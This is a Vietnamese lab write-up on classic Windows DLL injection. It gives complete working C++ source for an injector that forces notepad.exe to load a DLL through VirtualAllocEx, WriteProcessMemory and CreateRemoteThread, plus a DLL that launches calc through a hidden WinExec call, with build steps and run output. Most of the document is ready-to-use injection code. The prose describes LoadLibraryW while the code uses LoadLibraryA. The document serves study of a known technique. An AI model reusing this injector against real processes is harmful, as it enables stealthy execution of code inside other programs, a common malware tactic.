
---

# 📝 [PE 05] Classic DLL Injection

## 📌 1. Tổng Quan Kỹ Thuật (Technical Overview)

**Classic DLL Injection (Tiêm nhiễm thư viện liên kết động truyền thống)** đại diện cho mô hình can thiệp mô-đun phổ biến và kinh điển nhất trong kiến trúc hệ điều hành Windows.

Khác với các giải pháp bơm mã máy trực tiếp (Code/Shellcode Injection - PE 01 đến PE 04), giải thuật này không thực hiện sao chép các byte thực thi đơn lẻ (Opcode) vào RAM đối phương. Thay vào đó, Loader thực hiện **cưỡng bách tiến trình mục tiêu tự động nạp một tệp thư viện liên kết động (`.dll`) hoàn chỉnh từ đĩa cứng** vào không gian địa chỉ ảo của nó. Ngay khi mô-đun nhị phân này được ánh xạ, hàm khởi tạo đặc trưng **`DllMain`** sẽ lập tức kích nổ lọt lòng tiến trình đích dưới tư cách pháp nhân hợp pháp của nạn nhân, thừa hưởng toàn bộ Token bảo mật và đặc quyền của tiến trình vỏ bọc.

### 🎯 Mục tiêu nghiên cứu:

* **Mổ xẻ cơ chế Windows PE Loader**: Nghiên cứu quy trình nạp, ánh xạ mô-đun Image và xử lý các phân đoạn phụ thuộc của hệ điều hành Windows.
* **Làm chủ kỹ nghệ Ép nạp Mô-đun Từ xa**: Khai thác đặc tính thiết kế của hàm API hệ thống `LoadLibrary` để điều hướng luồng thực thi chéo tiến trình.

---

## 🔬 2. Giải Phẫu Cơ Chế Hệ Thống (Windows Internals Analysis)

Khi một ứng dụng chuẩn chỉ yêu cầu triệu hồi một tệp DLL, nó sẽ gọi hàm Subsystem `LoadLibrary`. Trình nạp PE Loader của Windows sẽ tiếp nhận, bốc tệp tin từ đĩa cứng, ánh xạ cấu trúc các phân đoạn PE lên RAM, phân giải bảng Import Address Table (IAT) và kích hoạt sự kiện **`DLL_PROCESS_ATTACH`** lọt lòng inside `DllMain`.

Quy trình toán học giải phẫu và ép nạp Image mô-đun chéo tiến trình của Lab PE 05 diễn ra qua 4 giai đoạn ngầm tại tầng Kernel:

```
[VirtualAllocEx: Cấp phát ô chứa đường dẫn]
       └──> [WriteProcessMemory: Bơm chuỗi đường dẫn tệp DLL]
                 └──> [Định vị tọa độ LoadLibraryW chéo RAM]
                           └──> [CreateRemoteThread: Khai hỏa PE Loader từ xa]

```
<br>
<img width="564" height="780" alt="image" src="https://github.com/user-attachments/assets/c8899333-fe5d-48c4-9999-d20dae94d173" />



1. **Khắc vạch ô chứa dữ liệu từ xa (`VirtualAllocEx`)**: Do hàm hệ thống `LoadLibraryW` yêu cầu tham số đầu vào là một con trỏ trỏ đến chuỗi ký tự Wide-character chứa đường dẫn của tệp DLL, Loader không thể truyền con trỏ cục bộ sang RAM đối phương do tính cô lập không gian địa chỉ ảo. Loader buộc phải sử dụng `VirtualAllocEx` để khởi tạo một trang nhớ mang cờ bảo vệ **`PAGE_READWRITE` (RW)** bên lòng tiến trình đích với kích thước vừa khít độ dài chuỗi ký tự.
2. **Ánh xạ chuỗi đường dẫn (`WriteProcessMemory`)**: Ghi dữ liệu chuỗi đường dẫn tệp DLL vật lý 
3. **Phân giải tọa độ Subsystem đồng bộ**: Một đặc tính toán học cốt lõi của kiến trúc Windows Subsystem là các thư viện lõi hệ thống như `kernel32.dll` và `ntdll.dll` đều được **ánh xạ (Map) vào cùng một tọa độ Base Address giống nhau trên RAM của mọi tiến trình** (tính năng ASLR chỉ cố định địa chỉ một lần duy nhất cho mỗi chu kỳ khởi động hệ điều hành). Do đó, tọa độ tuyệt đối của hàm **`LoadLibraryW`** trích xuất được từ RAM của Loader chính là địa chỉ tuyệt đối của hàm này bên lòng tiến trình `notepad.exe`.
4. **Cưỡng bách nạp mô-đun từ xa (`CreateRemoteThread`)**: Loader khởi tạo một Thread Object mới lọt lòng tiến trình đích, thiết lập con trỏ chỉ mục lệnh **`Rip`** trỏ thẳng vào tọa độ hàm `LoadLibraryW`, đồng thời nạp con trỏ ô nhớ chứa chuỗi đường dẫn từ xa vào thanh ghi tham số **`Rcx`**. CPU của đối phương thức dậy, tiếp nhận tham số đường dẫn và tự động kích hoạt trình nạp PE Loader để kéo file DLL vào không gian ảo của nó.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

### Source.cpp:
```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

#pragma comment(lib, "user32.lib")

// Bộ quét RAM động tìm PID thích ứng theo tên tiến trình (Không phân biệt chữ hoa/thường)
DWORD GetTargetProcessPID(const std::wstring& procName) {
    DWORD pid = 0;
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            // Tự động hóa đối chiếu hoa thường để detect Notepad.exe chính xác
            if (_wcsicmp(procName.c_str(), pe32.szExeFile) == 0) {
                pid = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return pid;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 05: CLASSIC DLL INJECTION REMOTE (CALC.EXE)" << std::endl;
    std::cout << "====================================================" << std::endl;

    // Tự động nhận diện file DLL nằm cùng thư mục chạy mà không cần gõ CLI
    const char* localDllName = "PandaDLL.dll";
    char fullDllPath[MAX_PATH];
    if (!GetFullPathNameA(localDllName, MAX_PATH, fullDllPath, NULL)) {
        std::cerr << "[-] Failed to resolve full DLL path!" << std::endl;
        std::cin.get();
        return EXIT_FAILURE;
    }

    std::wstring targetName = L"notepad.exe";
    DWORD dwPID = GetTargetProcessPID(targetName);

    if (dwPID == 0) {
        MessageBoxA(NULL, "[-] Target process not found! Please open Notepad first.", "Error", MB_OK | MB_ICONERROR);
        return EXIT_FAILURE;
    }

    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << dwPID << std::endl;
    std::cout << "[*] Duong dan DLL tuyet doi: " << fullDllPath << std::endl;

    // 1. Mở tiến trình đích với nhóm quyền cấu hình luồng bộ nhớ chéo tối giản
    HANDLE hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE, dwPID);

    if (!hProcess) {
        std::cerr << "[-] OpenProcess failed! Error code: " << GetLastError() << std::endl;
        std::cin.get();
        return EXIT_FAILURE;
    }

    // 2. Cấp phát trang nhớ động thích ứng an toàn từ xa gánh chuỗi đường dẫn
    SIZE_T dllPathLen = strlen(fullDllPath) + 1;
    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, dllPathLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteMem) {
        std::cerr << "[-] VirtualAllocEx failed!" << std::endl;
        CloseHandle(hProcess);
        std::cin.get();
        return EXIT_FAILURE;
    }
    std::cout << "[+] Trang nho chứa chuoi duong dan thiet lap tai: 0x" << std::hex << remoteMem << std::endl;

    // 3. Đẩy chuỗi đường dẫn tệp tin DLL xuyên biên giới sang RAM tiến trình đích
    if (!WriteProcessMemory(hProcess, remoteMem, fullDllPath, dllPathLen, NULL)) {
        std::cerr << "[-] WriteProcessMemory failed!" << std::endl;
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        std::cin.get();
        return EXIT_FAILURE;
    }
    std::cout << "[+] Ghi chuoi duong dan sang Notepad hoan tat." << std::endl;

    // 4. Định vị địa chỉ của hàm nạp thư viện LoadLibraryA mặc định trên hệ thống
    LPVOID loadLibAddr = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    if (!loadLibAddr) {
        std::cerr << "[-] Failed to resolve LoadLibraryA address!" << std::endl;
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        std::cin.get();
        return EXIT_FAILURE;
    }

    std::cout << "[*] Dang khoi tao luong CreateRemoteThread goi LoadLibraryA..." << std::endl;

    // 5. Ép tiến trình đích tự tạo Thread chạy LoadLibraryA để tự nạp DLL của ta
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibAddr, remoteMem, 0, NULL);
    if (!hThread) {
        std::cerr << "[-] CreateRemoteThread failed!" << std::endl;
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        std::cin.get();
        return EXIT_FAILURE;
    }

    // Đồng bộ chờ luồng tiêm thực thi hoàn tất dứt điểm cấu trúc
    WaitForSingleObject(hThread, INFINITE);

    // Thu hoạch địa chỉ Base Address của DLL trên vùng nhớ đích để chứng minh thành công
    DWORD exitCode = 0;
    GetExitCodeThread(hThread, &exitCode);
    std::cout << "[+] DLL injected successfully!" << std::endl;
    std::cout << "[+] Base Address cua module trong Notepad: 0x" << std::hex << exitCode << std::endl;

    // 6. Giải phóng tài nguyên hệ thống chống rò rỉ bộ nhớ ảo (Memory Leak)
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    std::cout << "\n[*] Hoan thanh quy trinh. Nhan Enter de dong cua so..." << std::endl;
    std::cin.get();

    return EXIT_SUCCESS;
}

```

### dllmain.cpp:
```cpp
#include "pch.h"
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "user32.lib")

// Luồng Thread phụ độc lập xử lý lệnh mở máy tính để né tránh hàng rào Loader Lock
DWORD WINAPI LaunchPayload(LPVOID lpParam) {
    WinExec("cmd.exe /c start calc", SW_HIDE);
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
    { // <--- THÊM DẤU NGOẶC NHỌN MỞ ĐỂ CÔ LẬP PHẠM VI SỐNG

        // Bước kiểm chứng trực quan kịch trần
        MessageBoxA(NULL, "DLL Injected successfully via LoadLibraryA!", "Success Info", MB_OK | MB_ICONINFORMATION);

        // Tạo luồng phụ để kích nổ calc.exe an toàn tuyệt đối
        HANDLE hThread = CreateThread(NULL, 0, LaunchPayload, NULL, 0, NULL);
        if (hThread) {
            CloseHandle(hThread);
        }
        break;

    } // <--- THÊM DẤU NGOẶC NHỌN ĐÓNG TẠI ĐÂY
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

```

<img width="1301" height="650" alt="image" src="https://github.com/user-attachments/assets/72a94efa-45ff-4b73-831f-2004f946fb6c" />


---

## 🎛️ 4. Cấu Hình Biên Dịch Dự Án (Build & Deployment)

Để bảo đảm file thực thi `.exe` cùng tệp tin mô-đun nhị phân `.dll` phụ thuộc vận hành mượt mà, độc lập, không dính lỗi thiếu môi trường liên kết động (CRT Dependencies) khi triển khai thực nghiệm:

### ⚙️ Thiết lập trên môi trường Microsoft Visual Studio:

1. Thiết lập thanh công cụ quản lý dự án ở chính xác cấu hình **`Release`** và nền tảng kiến trúc **`x64`**.
2. Truy cập: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại thông số thuộc tính `Runtime Library`, chuyển cấu hình sang cờ **`Multi-threaded (/MT)`** nhằm liên kết tĩnh toàn bộ thư viện hệ thống lọt lòng file nhị phân.
3. Click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để kết xuất tệp tin sạch bóng lỗi chuỗi hệ thống.

---

## 📊 5. Thực Nghiệm Kích Hoạt Thực Tế (Demonstration)

Khởi chạy tiến trình vỏ bọc `Notepad.exe` trên môi trường máy Lab, mở PowerShell ngoài đĩa thô thực thi tệp tin dự án để theo dõi ma trận căn lề logic:

```powershell
PS C:\Users\Admin\source\repos\Task6\PE05_Classic_DLL_Injection\x64\Release> C:\Users\Admin\source\repos\Task6\PE05_Classic_DLL_Injection\x64\Release\Classic_DLL_Injection.exe
====================================================
[*] PE 05: CLASSIC DLL INJECTION REMOTE (CALC.EXE)
====================================================
[+] Da tim thay Notepad.exe voi PID: 18052
[*] Duong dan DLL tuyet doi: C:\Users\Admin\source\repos\Task6\PE05_Classic_DLL_Injection\x64\Release\PandaDLL.dll
[+] Trang nho chß╗⌐a chuoi duong dan thiet lap tai: 0x0000024375E30000
[+] Ghi chuoi duong dan sang Notepad hoan tat.
[*] Dang khoi tao luong CreateRemoteThread goi LoadLibraryA...
[+] DLL injected successfully!
[+] Base Address cua module trong Notepad: 0xff80000

[*] Hoan thanh quy trinh. Nhan Enter de dong cua so...

```

### Demo
<img width="1920" height="600" alt="devenv_P3jw9hdaUH" src="https://github.com/user-attachments/assets/bf583db5-4602-41ad-befd-ff79ab6f6f7c" />


---
